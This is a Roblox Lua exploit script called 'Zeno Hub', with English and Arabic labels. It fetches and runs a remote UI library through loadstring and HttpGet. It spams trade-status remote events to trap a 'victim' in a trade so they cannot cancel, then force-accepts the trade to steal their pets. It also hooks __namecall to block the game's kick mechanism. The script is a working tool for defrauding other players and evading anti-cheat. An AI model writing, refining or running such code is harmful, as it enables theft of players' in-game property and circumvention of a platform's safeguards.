-- [[ ZENO HUB V2 | ETERNAL JAIL & PET STEALER ]] --

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "🌪️ ZENO HUB: ETERNAL JAIL",
   LoadingTitle = "🔒 جاري تفعيل نظام الحبس الأبدي...",
   LoadingSubtitle = "By Zeno - Anti-Escape System",
   ConfigurationSaving = { Enabled = false },
   KeySystem = false
})

-- [[ 🔄 قسم التريد المحصن ]] --
local TradeTab = Window:CreateTab("🔄 Eternal Jail", 4483362458)

_G.EternalJail = false

TradeTab:CreateToggle({
   Name = "Eternal Jail (الحبس الأبدي)",
   Info = "بيخلي الضحية مستحيل يخرج من التريد حتى لو ضغط Cancel",
   CurrentValue = false,
   Callback = function(v)
       _G.EternalJail = v
       if v then 
           Rayfield:Notify({Title = "ZENO HUB", Content = "Target is now TRAPPED! 🔒", Duration = 4})
       end
   end,
})

TradeTab:CreateButton({
   Name = "STEAL NOW (اسحب الحيوان الآن 💎)",
   Info = "اضغط هنا بعد ما تجمده عشان العملية تتم فوراً",
   Callback = function()
       pcall(function()
           local net = game:GetService("ReplicatedStorage").Network
           net.Trade_Accept:FireServer()
           -- إرسال أمر تأكيد إضافي لضمان السحب
           net.Trade_UpdateStatus:FireServer("Ready")
       end)
   end,
})

-- [[ 🛡️ نظام الحماية المتقدم ]] --
task.spawn(function()
    local old; old = hookmetamethod(game, "__namecall", function(self, ...)
        if getnamecallmethod() == "Kick" then return nil end
        return old(self, ...)
    end)
end)

-- [[ كود الحبس ومنع الخروج (The Jail Logic) ]] --
task.spawn(function()
    while task.wait(0.0001) do -- سرعة تفوق سرعة استجابة السيرفر
        if _G.EternalJail then
            pcall(function()
                local net = game:GetService("ReplicatedStorage"):WaitForChild("Network")
                -- إرسال "سبام" أوامر تحديث لتعطيل زرار الـ Cancel عند الخصم
                net.Trade_UpdateStatus:FireServer("Processing")
                net.Trade_UpdateStatus:FireServer("Locked")
            end)
        end
    end
end)
